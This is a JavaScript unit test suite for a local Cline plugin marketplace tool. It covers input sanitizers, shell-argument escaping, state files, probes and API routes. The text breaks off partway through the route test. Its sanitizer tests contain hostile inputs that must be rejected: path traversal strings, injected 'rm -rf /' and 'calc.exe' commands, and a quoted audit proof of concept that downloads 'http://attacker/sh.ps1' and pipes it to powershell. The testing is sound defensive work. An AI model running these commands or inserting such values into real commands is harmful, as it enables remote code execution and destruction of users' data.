#!/usr/bin/env node
// Pure unit test suite for Cline Marketplace sanitizers, state engine, reconciler, resolvers, CLI, probes, logger, runner, and routes.

import test from "node:test";
import assert from "node:assert/strict";
import express from "express";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, readdirSync, readFileSync, existsSync } from "node:fs";
import { tmpdir, homedir } from "node:os";
import { join, resolve } from "node:path";
import { resolveCommand, isWindowsBatchShim } from "../lib/resolver.js";
import {
  sanitizePrimitiveId,
  sanitizePrimitiveType,
  sanitizeWorkspacePath,
} from "../lib/sanitizers.js";
import { readJson, safeWriteJson, getDataDir } from "../lib/state.js";
import { reconcile } from "../lib/reconciler.js";
import { verbFor, resolveCline, runCline, resolveShimScript, escapeWindowsShellArg } from "../lib/runner.js";
import { isPortOpen, findAvailablePort } from "../bin/cline-marketplace.js";
import { parseYamlFrontmatter, extractLocalSkillMeta, clineRootCandidates, fsProbe, listDirSafe } from "../lib/probes.js";
import { logger, colors } from "../lib/logger.js";
import { createApiRouter, sanitizeInstallArgs, MAX_BULK_ITEMS } from "../lib/routes.js";

// Isolated temporary directory for persistence during unit tests
const testTmpDir = mkdtempSync(join(tmpdir(), "clinemarket-unit-"));
process.env.CLINEMARKET_DATA_DIR = testTmpDir;

process.on("exit", () => {
  try {
    rmSync(testTmpDir, { recursive: true, force: true });
  } catch {}
});

// -----------------------------------------------------------------------------
// 1. Sanitizers Test Suite
// -----------------------------------------------------------------------------
test("sanitizers: sanitizePrimitiveId", () => {
  // Valid IDs
  assert.equal(sanitizePrimitiveId("goal"), "goal");
  assert.equal(sanitizePrimitiveId("my-skill-123"), "my-skill-123");
  assert.equal(sanitizePrimitiveId("@scope/plugin"), null); // slashes blocked
  assert.equal(sanitizePrimitiveId("scope_name.v1"), "scope_name.v1");

  // Malicious / Path Traversal IDs
  assert.equal(sanitizePrimitiveId("../../../etc/passwd"), null);
  assert.equal(sanitizePrimitiveId("..\\..\\windows\\system32"), null);
  assert.equal(sanitizePrimitiveId("plugin/evil"), null);
  assert.equal(sanitizePrimitiveId("plugin; rm -rf /"), null);
  assert.equal(sanitizePrimitiveId("plugin && calc.exe"), null);
  assert.equal(sanitizePrimitiveId(""), null);
  assert.equal(sanitizePrimitiveId(null), null);
  assert.equal(sanitizePrimitiveId(undefined), null);
  assert.equal(sanitizePrimitiveId({}), null);
});

test("sanitizers: sanitizePrimitiveType", () => {
  assert.equal(sanitizePrimitiveType("plugin"), "plugin");
  assert.equal(sanitizePrimitiveType("skill"), "skill");
  assert.equal(sanitizePrimitiveType("mcp"), "mcp");
  assert.equal(sanitizePrimitiveType("PLUGIN"), "plugin");
  assert.equal(sanitizePrimitiveType("Skill"), "skill");

  // Invalid types
  assert.equal(sanitizePrimitiveType("malware"), null);
  assert.equal(sanitizePrimitiveType("exe"), null);
  assert.equal(sanitizePrimitiveType(""), null);
  assert.equal(sanitizePrimitiveType(null), null);
});

test("sanitizers: sanitizeWorkspacePath", () => {
  const cwd = process.cwd();
  assert.equal(sanitizeWorkspacePath(cwd), cwd);
  assert.equal(sanitizeWorkspacePath("non_existent_folder_xyz_123", cwd), cwd);
  assert.equal(sanitizeWorkspacePath("", cwd), cwd);
  assert.equal(sanitizeWorkspacePath(null, cwd), cwd);
});

test("sanitizers: isWindowsBatchShim", () => {
  assert.equal(isWindowsBatchShim("C:\\bin\\cline.cmd"), process.platform === "win32");
  assert.equal(isWindowsBatchShim("C:\\bin\\cline.bat"), process.platform === "win32");
  assert.equal(isWindowsBatchShim("C:\\bin\\cline.exe"), false);
  assert.equal(isWindowsBatchShim("/usr/local/bin/cline"), false);
  assert.equal(isWindowsBatchShim(null), false);
});

// -----------------------------------------------------------------------------
// 2. State Engine Test Suite
// -----------------------------------------------------------------------------
test("state: safeWriteJson and readJson serialization", async () => {
  const tmpFile = join(testTmpDir, `test-queue-${Date.now()}.json`);

  // Concurrent write stress test
  const writes = Array.from({ length: 5 }, (_, i) =>
    safeWriteJson(tmpFile, { iteration: i, timestamp: Date.now() })
  );

  await Promise.all(writes);

  const finalData = readJson(tmpFile);
  assert.ok(finalData, "File must exist and be valid JSON");
  assert.strictEqual(typeof finalData.iteration, "number", "iteration must be a number");
  assert.strictEqual(finalData.iteration, 4, "Final serialized iteration must be exactly 4");
});

test("state: getDataDir environment precedence (CLINEMARKET_DATA_DIR > DATA_DIR > default)", () => {
  const origCM = process.env.CLINEMARKET_DATA_DIR;
  const origDD = process.env.DATA_DIR;

  try {
    // 1. CLINEMARKET_DATA_DIR takes highest precedence
    process.env.CLINEMARKET_DATA_DIR = join(testTmpDir, "cm_override");
    process.env.DATA_DIR = join(testTmpDir, "dd_override");
    assert.strictEqual(getDataDir(), resolve(join(testTmpDir, "cm_override")));

    // 2. DATA_DIR used when CLINEMARKET_DATA_DIR is unset
    delete process.env.CLINEMARKET_DATA_DIR;
    process.env.DATA_DIR = join(testTmpDir, "dd_override");
    assert.strictEqual(getDataDir(), resolve(join(testTmpDir, "dd_override")));

    // 3. Fallback to defaultRoot/data when neither is set
    delete process.env.CLINEMARKET_DATA_DIR;
    delete process.env.DATA_DIR;
    const baseDir = join(testTmpDir, "custom_base");
    assert.strictEqual(getDataDir(baseDir), join(baseDir, "data"));
    assert.strictEqual(getDataDir(), join(process.cwd(), "data"));
  } finally {
    if (origCM !== undefined) process.env.CLINEMARKET_DATA_DIR = origCM;
    else delete process.env.CLINEMARKET_DATA_DIR;
    if (origDD !== undefined) process.env.DATA_DIR = origDD;
    else delete process.env.DATA_DIR;
  }
});

test("state: readJson quarantines corrupt JSON with .corrupt timestamp and returns fallback", () => {
  const corruptFile = join(testTmpDir, `corrupt-test-${Date.now()}.json`);
  writeFileSync(corruptFile, "{ invalid: json, not well formed syntax");

  const fallback = { safe: true, recovered: true };
  const readResult = readJson(corruptFile, fallback);

  assert.deepEqual(readResult, fallback, "readJson must return fallback on corrupted JSON");

  // Verify quarantine backup file was created
  const filesInDir = readdirSync(testTmpDir);
  const corruptBackups = filesInDir.filter((f) => f.startsWith(corruptFile.slice(testTmpDir.length + 1)) && f.includes(".corrupt."));
  assert.ok(corruptBackups.length >= 1, "A .corrupt.<timestamp> quarantine backup file must be created on disk");

  const backupContent = readFileSync(join(testTmpDir, corruptBackups[0]), "utf8");
  assert.strictEqual(backupContent, "{ invalid: json, not well formed syntax");
});

// -----------------------------------------------------------------------------
// 3. Runner & Process Management Test Suite
// -----------------------------------------------------------------------------
test("runner: verbFor maps primitive types correctly", () => {
  assert.equal(verbFor("plugin"), "plugin");
  assert.equal(verbFor("skill"), "skill");
  assert.equal(verbFor("mcp"), "mcp");
  assert.equal(verbFor("unknown"), "plugin");
});

test("runner: resolveCline returns cached or system binary path", async () => {
  const clinePath = await resolveCline();
  if (clinePath) {
    assert.ok(existsSync(clinePath), "Resolved cline path must exist on disk");
  }
});

test("runner: runCline executes version probe when available", async () => {
  const clinePath = await resolveCline();
  if (clinePath) {
    const result = await runCline(["--version"], { timeoutMs: 10000 });
    assert.ok(typeof result.code === "number", "Execution must return exit code");
    assert.ok(typeof result.stdout === "string", "Stdout must be string");
    assert.ok(typeof result.durationMs === "number", "Duration must be number");
  }
});

test("runner: resolveShimScript extracts JS entry from .cmd wrapper unconditionally", () => {
  const shimDir = join(testTmpDir, "shim-fixture");
  mkdirSync(shimDir, { recursive: true });

  const fakeJs = join(shimDir, "fake-cline.js");
  writeFileSync(fakeJs, "// fake cline entry\nprocess.exit(0);\n");

  const shimPath = join(shimDir, "fake-cline.cmd");
  writeFileSync(
    shimPath,
    [
      "@ECHO off",
      "GOTO start",
      ":find_dp0",
      "SET dp0=%~dp0",
      "EXIT /b %errorlevel%",
      ":start",
      "SETLOCAL",
      "CALL :find_dp0",
      'IF EXIST "%dp0%\\node.exe" (SET "_prog=%dp0%\\node.exe") ELSE (SET "_prog=node")',
      '"%_prog%"  "%dp0%\\fake-cline.js" %*',
    ].join("\r\n")
  );

  const resolved = resolveShimScript(shimPath);
  assert.ok(resolved, "Shim JS entry must be resolved from wrapper");
  assert.ok(existsSync(resolved), "Resolved JS entry must exist on disk");
  assert.ok(resolved.endsWith("fake-cline.js"), `Resolved entry must be fake-cline.js, got: ${resolved}`);

  // Shim sin entrada JS resoluble → null (habilita fallback con escape en runCline)
  const dummyShim = join(shimDir, "no-js.cmd");
  writeFileSync(dummyShim, "@ECHO off\r\nECHO hello\r\n");
  assert.strictEqual(resolveShimScript(dummyShim), null, "Wrapper without JS entry must return null");

  // Defensas de entrada
  assert.strictEqual(resolveShimScript(null), null);
  assert.strictEqual(resolveShimScript(undefined), null);
  assert.strictEqual(resolveShimScript(join(shimDir, "missing-shim.cmd")), null);
  assert.strictEqual(resolveShimScript(fakeJs), null, "Non-.cmd/.bat files must be rejected");
});

test("runner: escapeWindowsShellArg keeps metachars inside quoted literal (fallback C4-02)", () => {
  // Internal quotes are doubled per cmd.exe convention
  assert.strictEqual(escapeWindowsShellArg('say "hi"'), '"say ""hi"""');
  // Every argument is wrapped in double quotes: cmd.exe treats & | ; < > ` $ ( )
  // as literals inside quotes, neutralizing the injection.
  const hostile = ["a & calc.exe", "| powershell -", "; rm -rf /", "`whoami`", "$(evil)", "x<y>z", '"quoted"', "a'b", "&&", "||"];
  for (const arg of hostile) {
    const escaped = escapeWindowsShellArg(arg);
    assert.ok(escaped.startsWith('"') && escaped.endsWith('"'), `Hostile arg must be quoted: ${arg}`);
    assert.ok(!escaped.slice(1, -1).includes('"') || arg.includes('"'), `Internal quotes must only come from doubling: ${arg}`);
    assert.ok(escaped.length >= arg.length + 2, `Escaped arg must be wrapped: ${arg}`);
  }
  assert.strictEqual(escapeWindowsShellArg(""), '""');
});

test("routes: sanitizeInstallArgs rejects malicious catalog install.args (C4-01)", () => {
  // Literal PoC from audit 04 (C4-01) + injection variants
  const malicious = [
    ["x", "&", "curl", "http://attacker/sh.ps1", "|", "powershell", "-"],
    ["$(whoami)"],
    ["${IFS}"],
    ["`calc.exe`"],
    ["a; rm -rf /"],
    ["<nul"],
    [">file"],
    ['"quoted"'],
    ["it's"],
    ["..\\evil"],
    ["../evil"],
    [".."],
    ["--flag;evil"],
    ["--flag=va lue"],        // space: invalid token
    ["a|b"],
    ["100%"],                 // cmd variable expansion
    ["a^b"],
    [123],                    // elemento no-string
    [null],
    [{}],
    [""],
    ["   "],
    ["x".repeat(129)],        // exceeds the length cap
    [],                       // empty → provides no id, force fallback
    "not-an-array",
    null,
    undefined,
  ];
  for (const args of malicious) {
    assert.strictEqual(sanitizeInstallArgs(args), null, `Must reject: ${JSON.stringify(args)}`);
  }

  // Legitimate cases pass through intact and in order
  assert.deepEqual(sanitizeInstallArgs(["--yes"]), ["--yes"]);
  assert.deepEqual(sanitizeInstallArgs(["--config=lint.json", "--scope=global"]), ["--config=lint.json", "--scope=global"]);
  assert.deepEqual(sanitizeInstallArgs(["@scope/pkg@1.2.3"]), ["@scope/pkg@1.2.3"]);
});

// -----------------------------------------------------------------------------
// 4. Reconciler Test Suite
// -----------------------------------------------------------------------------
test("reconciler: correctly merges discovered primitives and detects drift", () => {
  const initialState = {
    items: {
      "plugin:old-plugin": {
        type: "plugin",
        id: "old-plugin",
        detected: true,
      },
      "skill:removed-skill": {
        type: "skill",
        id: "removed-skill",
        detected: true,
      },
    },
  };

  const probe = {
    found: {
      plugins: new Map([["old-plugin", { path: "/plugins/old-plugin" }], ["new-plugin", { path: "/plugins/new-plugin" }]]),
      skills: new Map(),
      mcps: new Map([["test-mcp", { config: { command: "node" } }]]),
    },
  };

  const reconciled = reconcile(initialState, probe);

  // Assertions
  assert.equal(reconciled.items["plugin:old-plugin"].detected, true);
  assert.equal(reconciled.items["skill:removed-skill"].detected, false); // drift detected
  assert.ok(reconciled.items["plugin:new-plugin"]);
  assert.equal(reconciled.items["plugin:new-plugin"].detected, true);
  assert.ok(reconciled.items["mcp:test-mcp"]);
  assert.equal(reconciled.items["mcp:test-mcp"].detected, true);
  assert.deepEqual(reconciled.items["mcp:test-mcp"].config, { command: "node" });
});

// -----------------------------------------------------------------------------
// 5. Command Resolver Test Suite
// -----------------------------------------------------------------------------
test("command resolver: resolves installed system binaries", async () => {
  const nodeExe = await resolveCommand("node");
  assert.ok(nodeExe, "node binary must resolve");
  assert.ok(existsSync(nodeExe), "Resolved path must exist");

  const nonExistent = await resolveCommand("non_existent_binary_xyz_9999");
  assert.strictEqual(nonExistent, null, "Non-existent command must return null");

  const selfPath = await resolveCommand(process.execPath);
  assert.strictEqual(selfPath, process.execPath, "Direct existing path must resolve to itself");
});

// -----------------------------------------------------------------------------
// 6. CLI Socket & Port Probing Test Suite
// -----------------------------------------------------------------------------
test("cli: isPortOpen defensive handling on invalid ports", async () => {
  assert.strictEqual(await isPortOpen(-1), false);
  assert.strictEqual(await isPortOpen(0), false);
  assert.strictEqual(await isPortOpen(65536), false);
  assert.strictEqual(await isPortOpen(999999), false);
  assert.strictEqual(await isPortOpen("invalid"), false);
  assert.strictEqual(await isPortOpen(null), false);
  assert.strictEqual(await isPortOpen(undefined), false);
  assert.strictEqual(await isPortOpen(NaN), false);
});

test("cli: findAvailablePort finds free socket", async () => {
  const freePort = await findAvailablePort(5900);
  assert.ok(typeof freePort === "number", "Free port must be a number");
  assert.ok(freePort >= 5900 && freePort <= 65535, "Port must be in valid range");
});

// -----------------------------------------------------------------------------
// 7. Probes & Metadata Extraction Test Suite
// -----------------------------------------------------------------------------
test("probes: listDirSafe handles non-existent or invalid directory paths", () => {
  assert.deepEqual(listDirSafe("non_existent_dir_12345"), []);
  assert.deepEqual(listDirSafe(null), []);
  assert.ok(Array.isArray(listDirSafe(process.cwd())), "Valid cwd must return array");
});

test("probes: parseYamlFrontmatter handles block scalars (> and |), multiline, quotes, and metadata", () => {
  // 1. Folded block scalar (>)
  const docFolded = `---
name: Test Folded Primitive
description: >
  This is a long description that spans
  across multiple lines in folded YAML
  and should be concatenated into a single clean line.
author: Cline Team
version: 1.2.0
---
# Body
Some Markdown body text`;

  const parsedFolded = parseYamlFrontmatter(docFolded);
  assert.strictEqual(parsedFolded.name, "Test Folded Primitive");
  assert.strictEqual(
    parsedFolded.description,
    "This is a long description that spans across multiple lines in folded YAML and should be concatenated into a single clean line."
  );
  assert.strictEqual(parsedFolded.author, "Cline Team");
  assert.strictEqual(parsedFolded.version, "1.2.0");

  // 2. Literal block scalar (|)
  const docLiteral = `---
name: Test Literal Primitive
description: |
  Line 1 of description.
  Line 2 of description.
author: "Quoted Author"
---
# Body`;

  const parsedLiteral = parseYamlFrontmatter(docLiteral);
  assert.strictEqual(parsedLiteral.name, "Test Literal Primitive");
  assert.strictEqual(parsedLiteral.description, "Line 1 of description.\nLine 2 of description.");
  assert.strictEqual(parsedLiteral.author, "Quoted Author");

  // 3. Metadata dictionary and list parsing
  const docWithMeta = `---
name: Skill With Metadata
description: Simple description
metadata:
  author: AI Team
  version: 3.0.0
  triggers: automated, devops
tags: [web, testing]
keywords:
  - automation
  - quality
---`;

  const fmMeta = parseYamlFrontmatter(docWithMeta);
  assert.strictEqual(fmMeta.name, "Skill With Metadata");
  assert.strictEqual(fmMeta.description, "Simple description");
  assert.strictEqual(fmMeta.metadata.author, "AI Team");
  assert.strictEqual(fmMeta.metadata.version, "3.0.0");
  assert.strictEqual(fmMeta.metadata.triggers, "automated, devops");
  assert.deepEqual(fmMeta.tags, ["web", "testing"]);
  assert.deepEqual(fmMeta.keywords, ["automation", "quality"]);

  // 4. Empty or invalid content returns empty object
  assert.deepEqual(parseYamlFrontmatter(""), {});
  assert.deepEqual(parseYamlFrontmatter(null), {});
  assert.deepEqual(parseYamlFrontmatter("No frontmatter content here"), {});
});

test("probes: extractLocalSkillMeta handles markdown body and frontmatter without > or | corruption", () => {
  // Test case A: Skill with folded block scalar (>) in SKILL.md
  const foldedSkillDir = join(testTmpDir, "skill-folded-test");
  mkdirSync(foldedSkillDir, { recursive: true });
  writeFileSync(
    join(foldedSkillDir, "SKILL.md"),
    `---
name: Clean Folded Skill
description: >
  High quality description line 1
  and continuation line 2.
metadata:
  author: Custom Author
  version: 2.1.0
  triggers: unit-test, regression
---
# Main Content
Some markdown body.`
  );

  const metaFolded = extractLocalSkillMeta(foldedSkillDir, "fallback-id");
  assert.strictEqual(metaFolded.name, "Clean Folded Skill");
  assert.strictEqual(metaFolded.description, "High quality description line 1 and continuation line 2.");
  assert.notStrictEqual(metaFolded.description, ">", "Description must not be corrupted to single '>' scalar");
  assert.notStrictEqual(metaFolded.description, "|", "Description must not be corrupted to single '|' scalar");
  assert.strictEqual(metaFolded.author, "Custom Author");
  assert.strictEqual(metaFolded.version, "2.1.0");
  assert.ok(metaFolded.tags.includes("unit-test"));
  assert.ok(metaFolded.tags.includes("regression"));

  // Test case B: Skill with package.json manifest
  const pkgSkillDir = join(testTmpDir, "skill-pkg-test");
  mkdirSync(pkgSkillDir, { recursive: true });
  writeFileSync(
    join(pkgSkillDir, "package.json"),
    JSON.stringify({
      name: "Package Skill",
      description: "From package.json manifest",
      version: "2.0.0",
      author: { name: "Manifest Author" },
      keywords: ["custom", "test"],
    })
  );

  const metaPkg = extractLocalSkillMeta(pkgSkillDir, "fallback-pkg");
  assert.strictEqual(metaPkg.name, "Package Skill");
  assert.strictEqual(metaPkg.description, "From package.json manifest");
  assert.strictEqual(metaPkg.version, "2.0.0");
  assert.strictEqual(metaPkg.author, "Manifest Author");
  assert.ok(metaPkg.tags.includes("custom"));

  // Test case C: Skill with only Markdown body and no frontmatter
  const bodySkillDir = join(testTmpDir, "skill-body-test");
  mkdirSync(bodySkillDir, { recursive: true });
  writeFileSync(
    join(bodySkillDir, "SKILL.md"),
    `# Skill Heading

This is the first standalone markdown paragraph describing the skill capabilities.

## Details
Additional info.`
  );

  const metaBody = extractLocalSkillMeta(bodySkillDir, "body-skill");
  assert.strictEqual(metaBody.name, "body-skill");
  assert.strictEqual(
    metaBody.description,
    "This is the first standalone markdown paragraph describing the skill capabilities."
  );
});

test("probes: clineRootCandidates includes ~/.commandcode and ~/.agents", () => {
  const candidates = clineRootCandidates();
  assert.ok(Array.isArray(candidates), "clineRootCandidates must return an array");

  // Every path in candidates must exist on filesystem
  for (const c of candidates) {
    assert.ok(existsSync(c), `Candidate root ${c} must exist on disk`);
  }

  const home = homedir();
  const commandcodePath = join(home, ".commandcode");
  const agentsPath = join(home, ".agents");

  if (existsSync(commandcodePath)) {
    assert.ok(
      candidates.includes(commandcodePath),
      `candidates must include ~/.commandcode when it exists on disk (${commandcodePath})`
    );
  }

  if (existsSync(agentsPath)) {
    assert.ok(
      candidates.includes(agentsPath),
      `candidates must include ~/.agents when it exists on disk (${agentsPath})`
    );
  }
});

test("probes: fsProbe discovers workspace-local custom skills and settings", () => {
  const mockWs = join(testTmpDir, "mock-workspace-fs");
  mkdirSync(join(mockWs, ".vscode"), { recursive: true });
  mkdirSync(join(mockWs, ".cline", "skills", "local-test-skill"), { recursive: true });

  writeFileSync(
    join(mockWs, ".cline", "skills", "local-test-skill", "SKILL.md"),
    `---\nname: Local Test Skill\ndescription: Discovered in workspace\n---\n# Content`
  );

  writeFileSync(
    join(mockWs, ".vscode", "cline_mcp_settings.json"),
    JSON.stringify({ mcpServers: { "ws-mcp-server": { command: "node", args: ["server.js"] } } })
  );

  const probe = fsProbe(mockWs);
  assert.ok(probe.roots.includes(join(mockWs, ".cline")), "Workspace .cline path must be registered as a candidate root");
  assert.ok(probe.found.skills.has("local-test-skill"), "Local skill must be found");
  assert.ok(probe.found.mcps.has("ws-mcp-server"), "Workspace MCP server must be found");
});

// -----------------------------------------------------------------------------
// 8. Structured Logger Test Suite
// -----------------------------------------------------------------------------
test("logger: all log methods and file rotation format correctly", () => {
  const logDir = join(testTmpDir, "test-logs");
  logger.initFileLogging({ logDir, retentionDays: 7 });

  logger.info("Test info message");
  logger.warn("Test warn message");
  logger.error("Test error message");
  logger.success("Test success message");
  logger.cli("Test cli message");
  logger.exec("cline plugin install test-plugin", 150, 0);
  logger.exec("cline plugin install test-plugin", 200, 1);
  logger.http("GET", "/api/catalog", 200, 25);
  logger.http("POST", "/api/install", 400, 10);
  logger.http("DELETE", "/api/mark", 500, 45);
  logger.storage("MUTATE", "installed.json");

  // Check recent in-memory logs
  const recLogs = logger.getRecentLogs(10);
  assert.ok(Array.isArray(recLogs));
  assert.ok(recLogs.length >= 5);

  // Check pruning
  const pruned = logger.pruneOldLogs(logDir, 14);
  assert.strictEqual(typeof pruned, "number");
});

// -----------------------------------------------------------------------------
// 9. API Router In-Process Comprehensive Test Suite
// -----------------------------------------------------------------------------
test("routes: createApiRouter handles all endpoints with in-process HTTP server", async () => {
  const CATALOG_PATH = join(testTmpDir, "router-catalog.json");
  const PREV_CATALOG_PATH = join(testTmpDir, "router-prev-catalog.json");
  const META_PATH = join(testTmpDir, "router-meta.json");
  const INSTALLED_PATH = join(testTmpDir, "router-installed.json");
  const WATCHLIST_PATH = join(testTmpDir, "router-watchlist.json");
  const CONTEXT_PATH = join(testTmpDir, "router-context.json");
  const SETTINGS_PATH = join(testTmpDir, "router-settings.json");

  // Create a mock rich catalog
  writeFileSync(
    CATALOG_PATH,
    JSON.stringify({
      generatedAt: new Date().toISOString(),
      baseUrl: "https://github.com/cline/marketplace",
      counts: { total: 3, marketplace: 3, local: 0, plugins: 1, skills: 1, mcps: 1 },
      entries: [
        { key: "plugin:goal", type: "plugin", id: "goal", name: "Goal", description: "Goal plugin for automation", author: { name: "Cline" }, tags: ["automation", "devops"], install: { command: "cline plugin install goal" } },
        { key: "skill:code-review", type: "skill", id: "code-review", name: "Code Review", description: "Code review skill", author: { name: "Reviewer" }, tags: ["review", "testing"] },
        { key: "mcp:db-mcp", type: "mcp", id: "db-mcp", name: "DB MCP", description: "Database MCP server", author: { name: "DBTeam" }, tags: ["databases", "sql"] },
      ],
    })
  );

  // Create mock previous catalog for changelog diff
  writeFileSync(
    PREV_CATALOG_PATH,
    JSON.stringify({
      generatedAt: new Date(Date.now() - 3600000).toISOString(),
      entries: [
        { key: "plugin:goal", type: "plugin", id: "goal", name: "Goal Old", description: "Goal plugin old", install: { command: "cline plugin install goal" } },
        { key: "plugin:removed-plugin", type: "plugin", id: "removed-plugin", name: "Removed" },
      ],
    })
  );

  // Set up mock workspace with multiple stack descriptors
  const mockWs = join(testTmpDir, "mock-stack-workspace");
  mkdirSync(join(mockWs, ".git"), { recursive: true });
  writeFileSync(
    join(mockWs, "package.json"),
    JSON.stringify({
      name: "mock-fullstack-app",
      dependencies: { express: "^5.0.0", react: "^19.0.0", typescript: "^5.0.0" },
      devDependencies: { jest: "^29.0.0" },
    })
  );
  writeFileSync(join(mockWs, "Dockerfile"), "FROM node:22\nCMD ['npm', 'start']");
  writeFileSync(join(mockWs, "Cargo.toml"), "[package]\nname = 'rust-core'");
  writeFileSync(join(mockWs, "go.mod"), "module my/app\ngo 1.22");

  const app = express();
  app.use(express.json());

  const router = createApiRouter({
    root: testTmpDir,
    dataDir: testTmpDir,
    CATALOG_PATH,
    PREV_CATALOG_PATH,
    META_PATH,
    INSTALLED_PATH,
    WATCHLIST_PATH,
    CONTEXT_PATH,
    SETTINGS_PATH,
  });

  app.use("/api", router);

  // Start in-process server on dynamic port 0
  const server = await new Promise((resolve) => {
    const s = app.listen(0, "127.0.0.1", () => resolve(s));
  });
  const port = server.address().port;
  const baseUrl = `http://127.0.0.1:${port}/api`;

  try {
    // 1. GET /api/version
    const vRes = await fetch(`${baseUrl}/version`);
    assert.strictEqual(vRes.ok, true);

    // 2. GET /api/catalog with queries and deduplication validation
    const catAll = await (await fetch(`${baseUrl}/catalog`)).json();
    assert.ok(catAll.counts);
    assert.ok(catAll.entries.length >= 3);
    for (const e of catAll.entries) {
      assert.ok(e.key, `Entry ${e.id} missing key`);
      assert.strictEqual(e.key, `${e.type}:${e.id}`);
    }
    const allKeys = catAll.entries.map((e) => e.key);
    assert.strictEqual(allKeys.length, new Set(allKeys).size, "Duplicate entries found in /api/catalog");

    const catQuery = await (await fetch(`${baseUrl}/catalog?q=goal&type=plugin&tag=automation&sort=popular`)).json();
    assert.ok(catQuery.entries.length >= 1);

    // 3. GET /api/installed
    const instRes = await (await fetch(`${baseUrl}/installed`)).json();
    assert.ok(instRes.items);

    // 4. GET /api/context
    const ctxRes = await (await fetch(`${baseUrl}/context?cwd=${encodeURIComponent(mockWs)}`)).json();
    assert.strictEqual(ctxRes.ok, true);
    assert.ok(ctxRes.languages.includes("javascript") || ctxRes.languages.includes("typescript"));
    assert.ok(ctxRes.bundles.length >= 1);

    // 5. GET /api/status & /api/health & /api/stats & /api/changelog & /api/export
    const stRes = await (await fetch(`${baseUrl}/status`)).json();
    assert.ok(stRes.node);

    const hlRes = await (await fetch(`${baseUrl}/health`)).json();
    assert.strictEqual(hlRes.ok, true);

    const statsRes = await (await fetch(`${baseUrl}/stats`)).json();
    assert.ok(statsRes.topAuthors);

    const chRes = await (await fetch(`${baseUrl}/changelog`)).json();
    assert.ok(Array.isArray(chRes.added));
    assert.ok(Array.isArray(chRes.removed));
    assert.ok(Array.isArray(chRes.updated));

    const expRes = await (await fetch(`${baseUrl}/export`)).json();
    assert.strictEqual(expRes.version, "1.0.0");

    // 6. Settings & Workspaces
    const setPost = await (await fetch(`${baseUrl}/settings`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ defaultScope: "workspace", themeContrast: "high", autoUpdateCheck: true }),
    })).json();
    assert.strictEqual(setPost.ok, true);
    assert.strictEqual(setPost.settings.defaultScope, "workspace");

    const getSet = await (await fetch(`${baseUrl}/settings`)).json();
    assert.strictEqual(getSet.defaultScope, "workspace");

    const wsBad = await fetch(`${baseUrl}/workspaces/recent`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    assert.strictEqual(wsBad.status, 400);

    const wsGood = await (await fetch(`${baseUrl}/workspaces/recent`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path: mockWs }),
    })).json();
    assert.strictEqual(wsGood.ok, true);

    // 7. Watchlist operations
    const wlAdd = await (await fetch(`${baseUrl}/watchlist`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "plugin", id: "goal" }),
    })).json();
    assert.strictEqual(wlAdd.starred, true);

    const wlList = await (await fetch(`${baseUrl}/watchlist`)).json();
    assert.ok(wlList.items.some((x) => x.key === "plugin:goal"));

    const wlToggle = await (await fetch(`${baseUrl}/watchlist/toggle`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "plugin", id: "goal" }),
    })).json();
    assert.strictEqual(wlToggle.starred, false);

    const wlDel = await (await fetch(`${baseUrl}/watchlist/plugin/goal`, { method: "DELETE" })).json();
    assert.strictEqual(wlDel.ok, true);

    // 8. Mark & Forget
    const markPost = await (await fetch(`${baseUrl}/mark`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "plugin", id: "custom-marked-p" }),
    })).json();
    assert.strictEqual(markPost.ok, true);

    const forgetDel = await (await fetch(`${baseUrl}/forget/plugin/custom-marked-p`, { method: "DELETE" })).json();
    assert.strictEqual(forgetDel.ok, true);

    // 9. Bulk operations
    const bulkWatch = await (await fetch(`${baseUrl}/bulk`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "watch",
        items: [{ type: "plugin", id: "bulk-1" }, { type: "skill", id: "bulk-2" }],
      }),
    })).json();
    assert.strictEqual(bulkWatch.ok, true);
    assert.strictEqual(bulkWatch.failedCount, 0, "Bulk watch must report failedCount in response");
    assert.strictEqual(Array.isArray(bulkWatch.results), true);

    const bulkUnwatch = await (await fetch(`${baseUrl}/bulk`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "unwatch",
        items: [{ type: "plugin", id: "bulk-1" }],
      }),
    })).json();
    assert.strictEqual(bulkUnwatch.ok, true);

    const bulkBad = await fetch(`${baseUrl}/bulk`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "unsupported" }),
    });
    assert.strictEqual(bulkBad.status, 400);

    // F3: hard bulk item limit → 413
    const bulkTooBig = await fetch(`${baseUrl}/bulk`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "watch",
        items: Array.from({ length: MAX_BULK_ITEMS + 1 }, (_, i) => ({ type: "plugin", id: `over-limit-${i}` })),
      }),
    });
    assert.strictEqual(bulkTooBig.status, 413, `Bulk with ${MAX_BULK_ITEMS + 1} items must return 413`);

    // At the exact limit it is accepted (watch is cheap and does not touch the runner)
    const bulkAtLimit = await fetch(`${baseUrl}/bulk`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "unwatch",
        items: Array.from({ length: MAX_BULK_ITEMS }, (_, i) => ({ type: "plugin", id: `over-limit-${i}` })),
      }),
    });
    assert.strictEqual(bulkAtLimit.status, 200);
    const bulkAtLimitBody = await bulkAtLimit.json();
    assert.strictEqual(bulkAtLimitBody.failedCount, 0);

    // 10. Import operations
    const impBad = await fetch(`${baseUrl}/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ installed: "invalid" }),
    });
    assert.strictEqual(impBad.status, 400);

    const impGood = await (await fetch(`${baseUrl}/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ installed: [{ type: "plugin", id: "imported-p", scope: "global" }] }),
    })).json();
    assert.strictEqual(impGood.ok, true);

    // 11. Context analysis with Python and Vue stack workspace
    const pythonWs = join(testTmpDir, "mock-python-stack");
    mkdirSync(pythonWs, { recursive: true });
